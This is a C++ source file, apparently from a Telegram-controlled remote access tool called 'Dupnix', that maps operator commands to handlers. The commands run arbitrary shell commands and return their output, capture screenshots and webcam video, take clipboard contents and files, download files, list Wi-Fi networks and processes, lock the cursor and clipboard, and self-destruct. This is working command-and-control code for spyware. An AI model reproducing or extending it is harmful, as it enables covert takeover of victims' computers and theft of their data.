#include "execute.h"

#include <vector>
#include <utility>
#include <functional>
#include <string>
#include <iostream>

#include <nlohmann/json.hpp>

#include "tools.h"
#include "parse.h"
#include "telegram.h"
#include "globals.h"
#include "commands.h"

std::vector <std::pair<std::string, void(*)(std::string)>> commands{
	{"ALL_ID", [](std::string cmd) { telegram::SendText("Dont use it with ID."); }},
	{"Status", getStatus},
	{"SetID", setID},
	{"Cmd", [](std::string cmd) { system(cmd.c_str()); }},
	{"CmdOutput", [](std::string cmd) { telegram::SendText(tools::cmd_output(cmd.c_str())); }},
	{"FunctionList", [](std::string) {
		std::string list;
		for (auto& i : commands) {
			list += i.first + "\n";
		}
		telegram::SendText(list);
	}},
	{"Volume", setVolume},
	{"Screenshot", Screenshot},
	{"MonitorOff", monitorOff},
	{"MonitorOn", monitorOn},
	{"ChangeCfg", ChangeCfg},
	{"CheckCfg", [](std::string) {telegram::SendText(tools::load_cfg().dump()); }},
	{"SetCursor", SetCursor},
	{"Delay", Delay},
	{"BlockCursor", BlockCursor},
	{"BlockClipboard", BlockClipboard},
	{"Press", Press},
	{"Hotkey", hotkeys},
	{"SendClipboard", SendClipboard},
	{"Autodestruction", Autodestruction},
	{"WriteToClipboard", WriteToClipboard},
	{"ProcessList", ProcessList},
	{"IsFileExists", IsFileExists},
	{"WebcamView", WebcamView},  // isnt tested
	{"ErrorSound", [](std::string) { MessageBeep(1); }},  // Doesnt works on my pc
	{"RunningApps", RunningApps},
	{"ListOfFiles", ListOfFiles},
	{"WifiList", WifiList},
	{"CloseForeground", TurnCloseForeground},
	{"DownloadFile", DownloadFile},
	{"SendFile", SendFile},
	{"UpdateDupnix", UpdateDupnix}
};

namespace execute {
	void execute(parse::ParsedMessage PM) {
		if (PM.ID != ID)
			return;
		std::cout << "Executing: " << PM.function << " with parameters: " << PM.parameters << std::endl;

		for (auto &i : commands) {
			if (tools::toLowerCase(i.first) == tools::toLowerCase(PM.function)) {
				i.second(PM.parameters);
				return;
			}
		}
		telegram::SendText(ID + ", function: " + PM.function + " not found. Try FunctionList to check possible functions.");
	}
}  // namespace execute
